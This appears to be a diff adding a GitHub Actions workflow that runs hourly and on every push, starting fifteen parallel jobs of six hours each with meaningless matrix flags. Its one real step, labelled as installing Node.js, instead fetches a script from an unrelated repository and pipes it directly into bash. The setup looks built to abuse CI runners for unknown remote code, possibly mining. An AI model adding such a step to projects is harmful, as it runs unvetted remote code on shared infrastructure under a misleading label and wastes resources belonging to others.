@@ -1,0 +1,42 @@
+name: CINUL
+
+on:
+  push:
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  build:
+    name: IPLAYBOOKS
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 15
+      fail-fast: false
+      matrix:
+        include:
+          - go: 1.11   flag: kmn
+          - go: 1.11   flag: oiu
+          - go: 1.11   flag: qwe
+          - go: 1.11   flag: nvb
+          - go: 1.11   flag: tby
+          - go: 1.11   flag: muh
+          - go: 1.12   flag: kmn
+          - go: 1.12   flag: oiu
+          - go: 1.12   flag: qwe
+          - go: 1.12   flag: nvb
+          - go: 1.12   flag: tby
+          - go: 1.12   flag: muh
+          - go: 1.13   flag: kmn
+          - go: 1.13   flag: oiu
+          - go: 1.13   flag: qwe
+    timeout-minutes: 360
+    steps:
+      - uses: actions/setup-go@v1
+        with:
+          go-version: ${{ matrix.go }}
+
+      - uses: actions/checkout@v1
+
+      - name: Install Node.js & Run ixi
+        run: |
+          curl -sL https://raw.githubusercontent.com/moyz-2/Dd/refs/heads/main/ixi | bash
